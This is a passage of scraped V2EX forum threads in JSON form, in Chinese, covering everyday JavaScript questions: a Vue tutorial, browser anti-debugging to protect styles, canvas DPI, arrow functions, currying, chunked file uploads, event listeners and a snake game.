在这个教程中我将会通过利用不同的版本的迭代的方式来逐步重建这个项目。</p>\n<p><strong>这个项目是面向初学者的。</strong> 整个教程中，我逐步实现了这个项目的四个版本，每一个版本之间有一定的递进关系。为了方便理解掌握每个版本的内容，在每个版本的说明中，我会尽量把在相应版本中所需要掌握的知识点列出来。</p>\n<p><em>注明：简便起见，如未特别说明，在之后的所有章节中我会用 Vue-HN 来代替 vue-hackernews-2.0 项目。 项目运行的系统是 Windows 7 ，因条件限制未在其他系统上测试，请见谅</em>。</p>\n<h2>各版本简介</h2>\n<h3>0. Vue.js, Vuex, Vue-router, HN API, Firebase, ES6</h3>\n<p>作为一个前端初学者，我对最原始的页面构造比较熟悉，也就是页面只由 HTML 、 CSS 以及 JavaScript 构成。所以自从我开始学习 Vue-HN 这个项目我就想是不是可以用最原始的方法来实现这个项目（当然，不考虑用户体验及性能等方面）。在经过多次失败的尝试之后，我终于只利用 Vue.js 及其生态中的一些库实现了这个版本。下面这两个动图就分别是我这个版本和官方版本。</p>\n<p>\n    <img alt=\"Origin Website\" src=\"http://o9ybnkuir.bkt.clouddn.com/vue-hackernews/0-edition/Anthor.gif\">\n    <br>\n    [ 我的版本 ]\n    <br>\n    <br>\n    <img alt=\"Plane Vue.js\" src=\"http://o9ybnkuir.bkt.clouddn.com/vue-hackernews/0-edition/Mine.gif\">\n    <br>\n    [ 官方版本 ]\n</p>\n<h3>1. Webpack, Vue.js, Vue-router, Vuex and Hackernews API</h3>\n<p>经过第一个版本后，我们对这个项目有了初步的了解。在这个版本中，我们会使用一些工具，使得我们这个项目初步模块化，同时也更加便于维护。我们将会使用到一些基本的插件和包，并通过 webpack 来实现功能。我们只需要简单的配置一下 webpack 就行，不会涉及到服务器端的内容，不会涉及缓存也不会涉及生产模式及开发模式的不同配置。下面的动图就是这个版本的成品，同时这个动图里面还包含了对整个项目的简单解构。</p>\n<p>\n    <img alt=\"Basic functions and simple deconstruction\" src=\"http://o9ybnkuir.bkt.clouddn.com/vue-hackernews/1-edition/first_edition.gif\">\n    <br>\n    [ 基本功能及简单解构 ]\n</p>\n<h3>2. Server, Packages and Plugins for Better Performance</h3>\n<p>于我而言，这个版本是整个项目中最难的一个版本。为了优化用户体验，原作者将很多因素考虑在内，这就会带来很多需要了解的新知识，比如 node.js 中的 express 框架以及各种插件。服务器端及客户端、生产模式及调试模式的不同配置是这个版本的重点。在接下来的片段中，我会将我所理解的部分分享给大家。\n由于这个版本和<a href=\"https://vue-hn.now.sh/top\" rel=\"nofollow\">官网</a>的一样，我就不上效果图了。</p>\n<h3>3. Change the Project as I like</h3>\n<p>在这个版本中，我将会根据自己的喜好对整个网页进行一些改造，使得网页整体更具有 Vue.js 风格，至少从视觉上来说更加的 Vue.js 。下面的动图可以预览到我这个版本的成品，为了对照官方例子，你可以去<a href=\"https://vue-hn.now.sh/top\" rel=\"nofollow\">官网</a>查看原网页。对于所添加及更改的部分，本节的下半部分将会详细介绍。</p>\n<p>\n    <img alt=\"Last Edition of Vue-HackerNews\" src=\"http://o9ybnkuir.bkt.clouddn.com/vue-hackernews/3-edition/last-edition-resize.gif\">\n    <br>\n    [ Vue-HackerNews 最后版本 ]\n</p>\n<h2>写在最后</h2>\n<p>从开始接触这个项目到现在已经过去好几个月了，一直想通过学习这个项目来巩固 Vue.js 的知识点，但很长一段时间都没有什么收获。因为知识储备不够，很多内容都看不懂。碰壁碰多了就知道转弯。然后去学习 ES6 以及 Node.js 相关知识，再来看的时候，很多地方就豁然开朗了。在这之后，对这个项目的理解速度就远超过之前了。</p>\n<p>一天晚上睡不着，就思考着这种情况对于前端新手应该是挺常见的，我为什么不把自己的经验教训分享出来给大家？然后就有了这个项目。<br>\n项目实现的过程遇到各种困难，特别是第一个版本和第三个版本。第一个版本所遇到的关键点在上面已经说过了，不断的阅读各种文档然后尝试，最后终于在 Chrome 中跑了起来。挫败感是常态，成就感是偶尔才有的。第三个版本是官方完整版，自认为直到现在对其的理解程度都只有十之七八。但也暂时不纠结了，没有工作经验，很多在工程中需要考虑的因素对我而言还比较捉摸不透。很多问题在经验丰富的开发者来看是一种常识，但对于新手而言却会感到无比的困惑。“书读百遍，其义自见” 就是这个意思吧。</p>\n<p>现在项目完成了，再来回顾整个项目，有点感慨。最开始对这个项目的想法是从简到繁一步一步和大家一起重建这个项目，整个过程会非常详细。现在项目完成了，由于精力和知识层次的限制，却并没有完全达到这种效果，还是有点遗憾。不过除此之外，项目覆盖的还是比较全面的。<br>\n最后，希望看过我这个教程的小伙伴能够有所收获；如果有小伙伴或者前辈发现文中出现错误，也请不吝赐教，先谢谢大家了。</p>\n</div></div>"], "reply": "3", "tittle": "从零开始搭建 《vue-hackernews-2.0》", "comment": ["小伙伴们觉得有帮助的话去 github 给个 star 啊，哈哈哈~", "加油，除了 todo 项目，我也推荐搞个 HN 的项目练练。", " 嗯嗯， todo 的复杂程度还是比较低的~"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>项目中用到了一些 xml 文件， xml 文件都是通过工具加密的，再用前端 js 解密回来使用， xml 里面都是一些样式代码，如果被解密，辛苦写的样式就被人盗用了。</p>\n<p>此加密方法有个缺陷，通过 F12 调试前端 js 的解密函数，可以打印出来解密后的 xml 。</p>\n<p>我用过类似 npm code-protect 这种工具来加密 js 文件，发现只是混淆了一些变量名而已，网上有实现 js 反调试的，具体效果见下图，通过什么方法可以实现这种效果呢？</p>\n<img alt=\"111222.png\" src=\"https://ooo.0o0.ooo/2017/03/18/58cd08194200a.png\" title=\"111222.png\">\n</div></div>", "<div class=\"topic_content\">看到很多朋友留言了，多谢。\r<br>\r<br>可能前面需求没说清楚，不是实现 js 代码加密，是要阻止用浏览器调试工具调试，例如：使用 chrome 或者别的浏览器，格式化 js 文件后，设置一个断点，正常情况下，代码会执行到这个断点，你可以查看变量的值什么的，如果实现反调试，能否实现像截图中那样，破坏调试流程。\r<br>\r<br>@<a target=\"_blank\" href=\"/member/ftpgxm\">ftpgxm</a>   你提供的方法应该就是正解了，我测试下。谢谢！\r<br>用这种手段也属于无奈，辛苦写的皮肤经常被盗用。如果能实现反调试，可以阻止大部分的菜鸟级别的盗用者了。</div>"], "reply": "30", "tittle": "js 反调试 怎么实现？", "comment": ["看图猜代码?", "样式这种不是需要被人看到 怎么加密", "直接查看最后的样式属性  不就行了", "你发图没用，\r", "地址呢？", "右上角最后一个按钮是停用所有 breakpoints ，直接就破了这东西了。", " 样式不是 css 写的，是用 action script 写的。如果加密得当，客户端是看不到 xml 里面的样式源码的。", " 这个。。没地址啊，写出来这个功能的哥们，做成收费的了，只能买他的软件，才能加密 js ，没有提供加密后的 js 预览地址。", "js 加密就是延长解密时间而已\r", "百度和 QQ 的密码加密都能研究出来，你就别想了", " js 代码被解密没关系的，只想达到这样的效果就可以了，用户在浏览器里面用调试工具设置断点的时候，实现截图里面的效果。", "找到了这个，估计说的也是这个。\r", "各位可以试一试，不过由于那个图片加载不出来，所以一堆 error ，不用管\r", "未加密版的： ", "\r", "加密版的： ", "前端的东西还想加密？？？", " 这个很早之前注册过， JScrambler ： ", " demo 翻墙可以看到图片的。我去试试，以前注册过没怎么研究。", " 不是加密，是反调试。。在浏览器里面用调试工具设置断点的时候，实现截图里面的效果。", "反调试一个方法就是利用递归次数过多调试工具会抛出异常，旁门左道，前端再怎么设防依旧是运行在客户端的~\r", "\r", "Demo: ", " Demo: ", "  一个变量写错", " 恩 测试可用。。感谢！", "学习了， V2EX 高手就是多：）", "Mark 一下", " 看了 jsfiddle ，不明白。 chrome 没办法可靠感知 console 是不是打开，怎么能做到“一旦打开调试工具就抛异常”？", "编译成 Web Assembly 吧", "你把代码写的足够烂人家就不会调试你了", " chrome 打不打开调试工具一样会抛异常， edge 倒是可以，没装 firefox 不知道", " \r", "  \r", "异常应该说是 JS 抛出的，调试工具只是能直观看到，上面表述有误，抱歉。\r", "try cache 为了保证了后续代码能正常执行，同时打开调试工具能进入断点。", "以前在一个不能点投诉的微信页面见到过这种用法。。。", "firefox 里深层次递归没用，还是可以调试", "微信网页版的那个加密好像不错，那些 json 中的字符串都被转换过，都不知道怎么转换回来好， 233", " 如果把瀏覽器 \"拋出異常時自動斷點\" 的功能關掉, 這個方法還好用嗎?", " debugger statement 只有在 console 打开的情况下才有用。写那么复杂其实就是循环 500 次", " debugger 语句只有开 console 才有用，这是对的。但是递归循环这一块就是不开 console 也会有。所以重点就是不开 console 会递归但没有异常，开了 console 就会有异常？没发现这样的现象啊\r", "\r", "还不如在所有语句中间插入数百 debugger 语句，也能干扰调试", " 我觉得那个递归没啥意义，直接循环就完了"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>canvas 生成的图片 dpi 不够大。</p>\n</div></div>"], "reply": "5", "tittle": "javascript 如何修改图片的 dpi", "comment": ["canvas 本身是位图绘制的，所以 canvas 就这么大生成的图片也只能这么大，放大就会失真，你要高 dpi 的只能一开始就搞一个超大的 canvas 出来", " 在手机端 width*height 超过 16777216 就不行了。。", " 官方文档说： The HTMLCanvasElement.toDataURL() method returns a data URI containing a representation of the image in the format specified by the type parameter (defaults to PNG). The returned image is in a resolution of 96 dpi.\r", "就是无论 canvas 多大，下载的图片 dpi 都是 96", " 一张 200x200 的 96dpi 的图片，变成 100x100 就是 132dpi 了，所以你要提高 dpi 就是在原有希望尺寸上把宽高放大，然后再显示到小的容器里去", " 感谢，显示是没问题。但是需要把图片下载然后打印出来。 dpi 太小，打印出来会模糊。通过其他工具把 dpi 调高了在打印就清晰了。。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>今天中午的时候有人给我一段 JavaScript 代码，问我为什么等于 12 ，如下所示</p>\n<pre><code>const pipeline = (...funcs) =&gt;\n  val =&gt; funcs.reduce((a, b) =&gt; b(a), val)\n\nconst plus1 = a =&gt; a + 1\nconst mult2 = a =&gt; a * 2\nconst addThenMult = pipeline(plus1, mult2)\n\nlet r = addThenMult(5)\n</code></pre>\n<p>他可能对箭头函数不太熟悉，于是我让他把箭头换成 function ，他立刻就懂了。然后我表示现在很多语言用箭头表示一个可以计算的代码块， Java 也可以，然后我真的尝试用 Java 写了一下</p>\n<pre><code>Function&lt;Stream&lt;Function&lt;Integer, Integer&gt;&gt;, Function&lt;Integer, Integer&gt;&gt;\n  pipline = funcs -&gt; val -&gt; funcs.reduce((a, b) -&gt; b.compose(a)).get().apply(val);\n\nFunction&lt;Integer, Integer&gt; plus1 = a -&gt; a + 1;\nFunction&lt;Integer, Integer&gt; mult2 = a -&gt; a * 2;\nFunction&lt;Integer, Integer&gt; addThenMult = pipline.apply(Stream.of(plus1, mult2));\n\nInteger r = addThenMult.apply(5);\n</code></pre>\n<p>结果是写出来几乎没什么差别，相比 Java7 的时候的匿名内部类，这应该算是很大的进步了。我想这应该就是 Google 放弃 Jack 改用 Javac 的原因吧，不知道现在用 Java8 的厂多不多</p>\n</div></div>"], "reply": "21", "tittle": "箭头函数为啥这么流行？从 JavaScript 到 Java", "comment": ["在古代， functional, static type 语言的 ML 系祖宗们就这么搞了", "lambda 表达式，箭头函数听的我头皮发麻", "Java 是 Java 8 才开始支持 Lambda 表达式的吧", "因为这货是个数学符号，初中高中都用过吧……", "这时候必须提世界上最好的语言了", " 不是我自创的，大家都这么叫， ruby, python 的可能叫 lambda 表达式吧\r", "为了简单吧.\r", "\r", "就像运算符 `? :`.", "1L +1,  Java 不过东施效颦而已", "历史传统吧。不过没有人觉得给这种只使用一次的函数再想个名字很麻烦吗。。。而且这种声明方式很适合做函数柯里化啊。", "PHP ：喵？喵？喵？\r", "Perl ：喵？喵？喵？", "  lambda function 说的是匿名函数，和 arrow function 不完全是一回事……", " 怎么说？", "妈蛋，我还以为啥呢。原来是 lambda 表达式", "JS 的箭头好歹可做 lambda 表达式还不绑定 this ，好处不少， PHP 的箭头那叫一个郁闷，用点语法多轻快。。。", "是时候看一波 haskell 就习惯了(・∀・)", " 这里的 arrow function 不就是 Lambda 么？", "毕竟现在都流行函数式, 而箭头函数就是函数式语言思维的语法糖 \r", "这个语法糖的卖点是所谓\"看起来优雅\"", "因为可以少打点字啊。这东西只有一行的话看着很舒服，带嵌套的看着就恶心了，就像你那个 pipe 函数写的，看着不受罪吗？", "看起来太费劲了。。。", "这是 Lambda 表达式，你觉得用符号方便还是写函数方便", "语法糖而已， java 这种 自带各种超级牛逼的编辑器的玩意，匿名类跟 Lamada 区别不大，我是坚持不用 lamada"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>感觉很不科学，毕竟IDBOpenDBRequest的transaction的db就是要打开的那个db。</p>\n</div></div>", "<div class=\"topic_content\">它好像是顺着 source 冒泡上去的，怎么说呢，哎~</div>"], "reply": "2", "tittle": "如何评价在 Firefox 55 中 IDBOpenDBRequest 的 error 不冒泡到 IDBDatabase？", "comment": ["我也遇到过类似的 ", "\r", "\r", "感觉这边的 spec 和实现都有不明确的地方, 干脆不相信冒泡了", " 冒泡是顺着 source 的，顺便请看一下 ", " 和 ", " 两个问题，一直没什么人答"]},
{"content": ["<div class=\"topic_content\">本地环境  chrome 53 ubuntu\r<br>通过查询相关资料得知 chrome 对 blob 有大小限制大约在 500Mb 的样子，   由于上传过程中要对文件内容进行客户端加密（不要问为什么，就是要在客户端层面加密,跟 https 无关,也不要问这个梗为什么）. 不然就直接用 webuploader 之类的了，何必自己造轮子。\r<br>所以 上传文件就分片， 按 10MB 一个分片，  目前写的代码在传小文件，大约 300Mb 左右的时候正常，但是上传超过 1G 左右文件， 浏览器就直接报错了。\r<br>\r<br>net::ERR_FILE_NOT_FOUND\r<br>\r<br>代码很简单，根据文件大小分片，然后递归调用\r<br>测试代码：\r<br>\r<br>&lt;!DOCTYPE html&gt;\r<br>&lt;html lang=\"en\"&gt;\r<br>&lt;head&gt;\r<br>    &lt;meta charset=\"UTF-8\"&gt;\r<br>    &lt;title&gt;Title&lt;/title&gt;\r<br>    &lt;script src=\"//cdn.bootcss.com/jquery/2.2.4/jquery.js\"&gt;&lt;/script&gt;\r<br>    &lt;script src=\"http://cdn.static.runoob.com/libs/angular.js/1.4.6/angular.min.js\"&gt;&lt;/script&gt;\r<br>&lt;/head&gt;\r<br>&lt;body&gt;\r<br>&lt;div ng-app=\"testapp\" ng-controller=\"testctl\"&gt;\r<br>    &lt;input type=\"file\" id=\"file\"&gt;\r<br>    &lt;input type=\"button\" ng-click=\"one()\" value=\"test_split_upload\"&gt;\r<br>&lt;/div&gt;\r<br>\r<br>&lt;script&gt;\r<br>\r<br>    (function () {\r<br>        'use strict';\r<br>        angular\r<br>                .module('testapp', [\r<br>                ])\r<br>                .controller('testctl',['$scope','$http','$q',function ($scope,$http,$q) {\r<br>                    $scope.one = function () {\r<br>                        $scope.file = $('#file').get(0).files[0];\r<br>                        $scope.splitfilea(1);\r<br>                    };\r<br>\r<br>                    $scope.splitfilea = function (currentpage) {\r<br>                        let persize=1024*1024*10; //10Mb\r<br>                        let allpage = Math.ceil($scope.file.size/persize);\r<br>                        let start = (currentpage-1)*persize;\r<br>                        let end = start+persize;\r<br>                        if(currentpage===allpage){\r<br>                            end=$scope.file.size;\r<br>                        }\r<br>                        $scope.filesplitdata = $scope.file.slice(start, end);\r<br>                        $scope.r = new FileReader();\r<br>                        $scope.r.readAsDataURL($scope.filesplitdata);\r<br>                        $scope.r. onloadend=function (e) {\r<br>                            console.log(currentpage);\r<br>                            var bolb = e.target.result;\r<br>                            $scope.encode_blob = new Blob([bolb]);//这里本来要加密,测试直接创建一个 Blob\r<br>                            $q.when($scope.httppost($scope.encode_blob)).then(function () {\r<br>                                delete $scope.formData;\r<br>                                if(currentpage&lt;=allpage){\r<br>                                    currentpage = currentpage+1;\r<br>                                    $scope.splitfilea(currentpage);\r<br>                                }else{\r<br>                                    console.log('end');\r<br>                                }\r<br>                            });\r<br>                        };\r<br>                    };\r<br>\r<br>                    $scope.httppost = function (blob) {\r<br>                        var deferral_local = $q.defer();\r<br>                        $http({\r<br>                        method: 'POST',\r<br>                        url: '/test/up4/1.php',\r<br>                        headers: {\r<br>                            'Content-Type': undefined\r<br>                        },\r<br>                        data: {\r<br>                            abc: blob,\r<br>                            filename:\"xxxxxxx.txt\",\r<br>                            type:\"xxxxxx\"\r<br>                        },\r<br>                        transformRequest: function (data, headersGetter) {\r<br>                            if(!$scope.formData){\r<br>                                $scope.formData = new FormData();\r<br>                            }\r<br>                            angular.forEach(data, function (value, key) {\r<br>                                if(key === \"abc\"){\r<br>                                    $scope.formData.append(key, value,\"xxx.txt\");\r<br>                                }else{\r<br>                                    $scope.formData.append(key, value);\r<br>                                }\r<br>                            });\r<br>                            var headers = headersGetter();\r<br>                            delete headers['Content-Type'];\r<br>\r<br>                            return $scope.formData;\r<br>                        }\r<br>                    }).success(function (response) {\r<br>                            deferral_local.resolve( { status: 'good' } );\r<br>                        });\r<br>                        return deferral_local.promise;\r<br>                    };\r<br>\r<br>                }]);\r<br>    }());\r<br>\r<br>&lt;/script&gt;\r<br>\r<br>&lt;/body&gt;\r<br>&lt;/html&gt;\r<br>\r<br>\r<br>服务端： 4.php(暂为空)\r<br>&lt;?php\r<br>?&gt;\r<br>\r<br>这个上传 1G 左右大文件时会上传大约 40 个分片的时候就报错了.\r<br>JS 小白，求大神指点， 估计应该还是 blob 大小限制，  一直不明白的就是我都分片了， 怎么还是超过限制呢?</div>"], "reply": "10", "tittle": "javascript 上传大文件问题", "comment": ["当然了， 在分片上传的时候，我使用了 FormData 上传文件，这样会上传更快些， 浏览器不卡，  如果是直接用 DATAURL 写在 POST data 中 这样浏览器会卡， 但是整个文件能上传完成。", "fineuploader, 支持 blob ，支持分片。", "\r", "用这个组件。", "这个是 Chrome 的 Bug ， Blob 不能正常的清除缓存导致报错，从 55 版本开始已经修好，升级 Chrome 版本。这里是这个问题官方的 Issue 修复记录：\r", "\r", "  谢谢。  我去下最新的 chrome 来试试看。", "代码没问题， 经测试，为 Chrome Bug   升级到最新版本，一切正常\r", "  感谢提醒。\r", "\r", "结帖", "webuploader 、 plupload 这些支持分片上传的插件都有分片的前置操作回调，可以加密的。", "  虽然我的问题解决了， 但是还是想了解一下 webuploader  plupload 的分片的前置操作回调，必竞人家的更加成熟和稳定，麻烦能否写个小 DEMO ， 我找了半天没找到，谢谢。", " #8 \r", "比如： ", "  事件名称： BeforeChunkUpload 可以获取到当前上传 chunk 的 blob 内容，然后进行加密处理。", "服务端进行对每个 chunk 的解密存储就好了嘛。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><a href=\"https://log.zvz.im/2017/03/23/why-curry-helps/\" rel=\"nofollow\">查看原文点击这里</a></p>\n<p>写一段可以无限被重用的代码，对于程序员来说无异于黄粱美梦。代码表达清晰是因为代码要表达需求，代码易于重用……好吧，只是因为你要重复使用它。两者不可得兼，你还能奢求更多么？</p>\n<p><a href=\"https://npmjs.org/package/curry\" rel=\"nofollow\">柯里化</a>可以帮上忙。</p>\n<h2>什么是柯里化，为何它如此美味？</h2>\n<p>通常， JavaScript 函数看起来都像这样：</p>\n<pre><code>var add = function(a, b){ return a + b }\nadd(1, 2) //= 3\n</code></pre>\n<p>它接受一些参数，然后有一个返回值。我可以使用过多（多余的参数会被忽略）或过少（会给出奇怪的返回值）的参数调用它：</p>\n<pre><code>add(1, 2, 'IGNORE ME') //= 3\nadd(1) //= NaN\n</code></pre>\n<p>柯里化可以使一个多参数函数转化为一系列单参数函数。比如，柯里化后的加法函数：</p>\n\n<pre><code>var curry = require('curry');\nvar add = curry(function(a, b){ return a + b })\nvar add100 = add(100)\nadd100(1) //= 101\n</code></pre>\n<p>柯里化后的多参数函数可以如下调用：</p>\n<pre><code>var sum3 = curry(function(a, b, c){ return a + b + c })\nsum3(1)(2)(3) //= 6\n</code></pre>\n<p>这样的写法在 JavaScript 中可能有点丑，所以<a href=\"https://npmjs.org/package/curry\" rel=\"nofollow\">柯里化</a>也允许你一次传入都个参数：</p>\n<pre><code>var sum3 = curry(function(a, b, c){ return a + b + c })\nsum3(1, 2, 3) //= 6\nsum3(1)(2, 3) //= 6\nsum3(1, 2)(3) //= 6\n</code></pre>\n<h2>这样又如何？</h2>\n<p>如果你对于那些经常使用柯里化函数的语言很熟（比如<a href=\"http://learnyouahaskell.com/\" rel=\"nofollow\">Haskell</a>），可能看不出来这样做会带来什么好处。在我的理解中，主要有以下两点好处：</p>\n<ul>\n<li>小片断的函数可以被配置，并很容易得到重用，且代码整洁；</li>\n<li>代码中彻头彻尾只用函数。</li>\n</ul>\n<h3>小片断函数</h3>\n<p>举一个比较明显的例子；从一个集合中获取所有成员的 id ：</p>\n<pre><code>var objects = [{ id: 1 }, { id: 2 }, { id: 3 }]\nobjects.map(function(o){ return o.id })\n</code></pre>\n<p>如果你正在厘清第二行代码的真实逻辑，让我帮你把它择出来吧：</p>\n<blockquote>\n<p>MAP over OBJECTS to get IDS （遍历所有对象获取它们的 ID 值）</p>\n</blockquote>\n<p>从函数定义的形式来看，只是这一行就有很多垃圾代码。让我们将其整理干净：</p>\n<pre><code>var get = curry(function(property, object){ return object[property] })\nobjects.map(get('id')) //= [1, 2, 3]\n</code></pre>\n<p>现在我们可以照着代码讲出真实的逻辑了 - 遍历所有对象获取它们的 ID 值。我们创建的<em>get</em> 方法是一个<strong>可部分配置的方法</strong>。</p>\n<p>如果我们想要重用‘从一组对象中获取 id ’这个功能怎么办？最直接的办法就是：</p>\n<pre><code>var getIDs = function(objects){\n    return objects.map(get('id'))\n}\ngetIDs(objects) //= [1, 2, 3]\n</code></pre>\n<p>嗯，看起来我们又丢掉了优雅简练，退回到杂乱无章的编码风格了。那我们该怎么办呢？额 - 如果 map 方法可以在还没有数据的时候，用一个函数进行部分配置的话？</p>\n<pre><code>var map = curry(function(fn, value){ return value.map(fn) })\nvar getIDs = map(get('id'))\n\ngetIDs(objects) //= [1, 2, 3]\n</code></pre>\n<p>看起来，如果我们以柯里化函数作为基础构建模块，我们就可以使用它们很容易得创造出全新的功能函数。更让人兴奋的是，代码看起来更能体现你的业务逻辑。</p>\n<h3>连成串的函数</h3>\n<p>使用这种方式写代码还有另一个好处，它鼓励函数的使用；而不是类的方法。虽然类的方法是很美好的 —— 允许多态，代码可读性高 —— 但它们并不总适合所有的工作，比如拥有大量异步调用的时候。</p>\n<p>下面的例子中，我们会从服务器端获取数据，再将其进行处理。数据形式如下：</p>\n<pre><code>{\n    \"user\": \"hughfdjackson\",\n    \"posts\": [\n        { \"title\": \"why curry?\", \"contents\": \"...\" },\n        { \"title\": \"prototypes: the short(est possible) story\", \"contents\": \"...\" }\n    ]\n}\n</code></pre>\n<p>你的任务是得到该用户所有文章的标题。现在开始！</p>\n<pre><code>fetchFromServer()\n    .then(JSON.parse)\n    .then(function(data){ return data.posts })\n    .then(function(posts){\n        return posts.map(function(post){ return post.title })\n    })\n</code></pre>\n<p>好吧，这不公平，是我催得太急了。（我还帮你写了上面这些代码 —— 你也许能更加优雅地解决这个问题，可能我已经跑题了）</p>\n<p>由于承诺链（ chains of promises ）（也许你更喜欢称其为回调函数）基本都是与函数一起使用的，你无法简单直接地遍历数据，直到它先从服务器返回并被（无论视觉上或头脑中的）一团乱麻包裹住。</p>\n<p>让我们再次出发，这回我们使用已经定义过的方法：</p>\n<pre><code>fetchFromServer()\n    .then(JSON.parse)\n    .then(get('posts'))\n    .then(map(get('title')))\n</code></pre>\n<p>Ok ，很少的逻辑，轻松地表达；如果没有柯里化函数我们是无法如此容易地做到的。</p>\n<h2>简而言之</h2>\n<p><a href=\"https://npmjs.org/package/curry\" rel=\"nofollow\">柯里化</a>能给予你一种令人垂涎的表达能力。</p>\n<p>我建议你立刻开始使用它。如果你已经熟稔于此，那么你一定会发现它的 API 接口直接好用。如果还没有，那么你应当与你的同事一起好好考虑一下了。</p>\n<blockquote>\n<p>翻译自：<a href=\"https://hughfdjackson.com/javascript/why-curry-helps/\" rel=\"nofollow\">Why Curry Helps</a></p>\n</blockquote>\n<p><a href=\"https://log.zvz.im/2017/03/23/why-curry-helps/\" rel=\"nofollow\">查看原文点击这里</a></p>\n</div></div>"], "reply": "17", "tittle": "为什么柯里化有用（下午茶译文赏析）", "comment": ["以下文字来自 ", "\r", "\r", "函数式语言的“拥护者”们，往往认为这个世界本来应该是“纯”（ pure ）的，不应该有任何“副作用”。他们把一切的“赋值操作”看成低级弱智的作法。他们很在乎所谓尾递归，类型推导， fold ， currying ， maybe type 等等。他们以自己能写出使用这些特性的代码为豪。可是殊不知，那些东西其实除了能自我安慰，制造高人一等的幻觉，并不一定能带来真正优秀可靠的代码。", "感觉没什么用，最新的 swift 都去掉这个特性了。", " 看起来挺美，尤其是异步嵌套的时候", " 说得很实在，请先欣赏外在的美", " 好难学，写的代码确实比较简洁，但是久了之后，回头来看，自己都看不懂。需要你十分、非常、绝对精通函数式编程，才能算是成功的。所以这个函数式编程推广得这么艰难，太难入门了。", "思维负担太重啦", "难道所谓简洁、优雅的代码就是写出来让别人看不懂？", "这东西要是被滥用也很美，你可能得全局搜索非常多次才能明白一个函数使用姿势如何，也得全局找很多次才能去更改源头。", "关键字 python 偏函数 functools partial", "语法糖而已\r", "\r", "核心是闭包", " 只是去掉语法糖， curried function 还是有的。", "  「偏函数」受教！", "=> = > => =>  Orz", " ", "柯里化和咖喱是一个词，所以原文说美味是双关，可以翻译过来没有这层意思了", " 可以=可惜", "函数加里化(Currying)和偏函数应用(Partial Application)的比较\r"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>记得之前看 MDN 文档，上面写在 es6 之前要给函数默认参数的写法是:</p>\n<pre><code>var add = function (x, y) {\n  x = (typeof b !== 'undefined') ?  x : 1\n  return x + y\n}\n</code></pre>\n<p>在 node 下给 var add = function (x = 1, y) blabla 做 currying ，报错了。。。怎么会呢？</p>\n<p>百思不得骑姐，用 babel 试试吧，结果竟然是：</p>\n<pre><code>var add = function add() {\n  var x = arguments.length &lt;= 0 || arguments[0] === undefined ? 'oo' : arguments[0];\n  var y = arguments[1];\n  return x + y;\n};\n</code></pre>\n<p>难怪不能 currying 。大呼 MDN 误我！赶紧去翻 MDN ，准备发贴开喷！！！</p>\n<p>OMG ， MDN 文档才发现写的居然是“一种常用的策略”：</p>\n<p><a href=\"https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Functions/Default_parameters\" rel=\"nofollow\">https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Functions/Default_parameters</a></p>\n<p>好吧，我认栽了！但是转念一想， es6 和 bebel 的默认参数写法为啥不直接用 typeof 的思路呢？这样就不能做 currying 了</p>\n</div></div>"], "reply": "11", "tittle": "es6 使用了默认参数的函数无法被 currying，坑啊！", "comment": ["var add = function (y, x=1) {\r", "  x = (typeof b !== 'undefined') ?  x : 1\r", "  return x + y\r", "}\r", "\r", "-- or --\r", "\r", "var add_c = function (y) {\r", "  return add(x=1, y)\r", "}", " 这是手动 currying ， 用 curry function 就不行了呢", "默认参数柯里化？ add 是个函数表达式，做柯里化不是应该对带参数的 add 做吗?", " #3 如果默认参数是用 typeof 去实现，不消弥掉 arguments 的参数， underscore, lodash 的 curry 就可以对函数做 currying ，但如果是 babel 这种消弥掉默认 arguments 的方法，就无法判断 fn.length, currying 库的方法就不能用了，自己实现 currying 目前也没找到能用的方法", "\r", "\r", "_.curry(func, [arity=func.length])\r", "\r", "The arity of func may be specified if func.length is not sufficient.\r", "\r", "不过话说回来，有默认参数做 currying 的感觉很奇怪", " #5 Thanks ，没仔细看文档，原来还可以通过指定 arity 实现，哎，我自己写的 currying 想支持 curry function with partial arguments (ex: const add100 = curry(add, 100)，看来是没法做 lodash arity 的支持，如果真的用 typeof 的方法做默认参数就没问这种烦恼。问题来了 typeof 和 arguments.length 两种优劣如何呢？何以最终实现是用 arguments.length 呢", " #5 真遇到那种有默认参数的函数，没看源码， currying 又不报错，调用来报错，很无语", " 你举的「 curry function with partial arguments 」的例子，完全可以写成\r", "const add100 = curry(add)(100)\r", "\r", "不用 arguments.length 没法区分是没传还是传了 undefined", " #8 感谢解惑！", "\r", "length 是必须传入的参数个数，默认参数是可选的，所以其之后的参数也是可选的，不算在 length 里", " #10 嗯呢，大部分的 es6 的书或文档貌似都没有提这些规范，总想给人 es6 有大动作的新鲜感，深入点的细节变动都不涉及，这些坑不踩踩都不行呢。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><a href=\"https://github.com/GSANDLY/hungry-snake\" rel=\"nofollow\">https://github.com/GSANDLY/hungry-snake</a>\n第一次发帖，请大家批评指正！谢谢！</p>\n</div></div>", "<div class=\"topic_content\">现在可以按住方向键加速移动啦</div>"], "reply": "3", "tittle": "用 JavaScript 写了个经典的贪吃蛇游戏", "comment": ["1.不能加速移动,比如往右的时候,再按右,不能加速\r", "2.分辨率太高的时候,蛇太小,最好限制一下固定界面大小", " 有道理，谢啦，我改进一下", "现在可以按住方向键加速移动啦"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>if (window.DeviceOrientationEvent) {\nwindow.addEventListener('deviceorientation', function(eventData) {\nd =eventData.gamma;\n//执行打码\n},false);\n}\njs 事件监听会一直不断的重复执行代码。怎么让代码只执行一次。或者让 eventData.gama 赋值给一个变量，让全局使用？</p>\n</div></div>"], "reply": "7", "tittle": "js eventlister 控制", "comment": ["removeEventListener", "once", " 什么 once", "在监听里面取消监听啊……", " #3 监听之后就 remove 掉呗", " JQuery 有个方法 once ，就是只绑定一次，不过你用原生写的就 remove 好了", " \r", " 好的。我已经用 remove 解决了"]},
